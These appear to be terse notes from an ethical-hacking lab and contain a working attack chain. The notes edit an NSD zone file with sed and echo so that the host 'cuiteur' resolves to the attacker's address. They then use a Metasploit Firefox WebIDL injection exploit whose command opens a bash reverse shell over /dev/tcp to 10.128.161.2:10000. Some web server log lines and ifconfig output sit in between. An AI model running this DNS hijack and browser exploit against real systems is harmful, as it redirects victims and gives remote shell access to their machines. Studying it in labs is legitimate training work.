# Kilo notes

```bash
cat /etc/nsd/ethhak.zone
```

```text
$TTL 300      ; Default TTL (5 minutes)
@   IN  SOA     ns1.ethhak. admin.ethhak. (
                2023102501 ; Serial (YYYYMMDDnn)
                3600       ; Refresh (1 hour)
                900        ; Retry (15 minutes)
                1209600    ; Expire (2 weeks)
                86400 )    ; Minimum TTL (1 day)

ns1     IN  A   10.128.161.41          
cuiteur IN  A   10.128.161.27
```

```text
ns1     IN  A   10.128.161.2          
cuiteur IN  A   10.128.161.2
```

```bash
sed -i '$ d' /etc/nsd/ethhak.zone
```

```bash
echo "cuiteur IN  A   10.128.161.2" >> /etc/nsd/ethhak.zone
```

```text
10.13.13.1:55664 - "GET / HTTP/1.1" 200
 ▕  10.13.13.1:55664 - "GET /favicon.ico HTTP/1.1" 404
 ▕  10.13.13.1:55676 - "GET /favicon.ico HTTP/1.1" 404
```

```text
zone:
    # Define your domain
    name: "ethhak"
    # Specify the zone file for this domain
    zonefile: "ethhak.zone"
```

```text
ns1     IN  A   10.128.161.41          
cuiteur IN  A   10.128.161.27
```

```text
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1450
        inet 10.128.162.11  netmask 255.255.255.0  broadcast 10.128.162.255
        ether 02:42:0a:80:a2:0b  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3  bytes 126 (126.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1450
        inet 10.128.161.46  netmask 255.255.255.0  broadcast 10.128.161.255
        ether 02:42:0a:80:a1:2e  txqueuelen 0  (Ethernet)
        RX packets 14184  bytes 4521206 (4.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16084  bytes 1763726 (1.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```bash
use firefox_webidl_injection
set payload firefox/exec
set srvhost 0.0.0.0
set srvport 80
set uripath /
set cmd '/bin/bash -c "bash -i >& /dev/tcp/10.128.161.2/10000 0>&1"'
exploit
```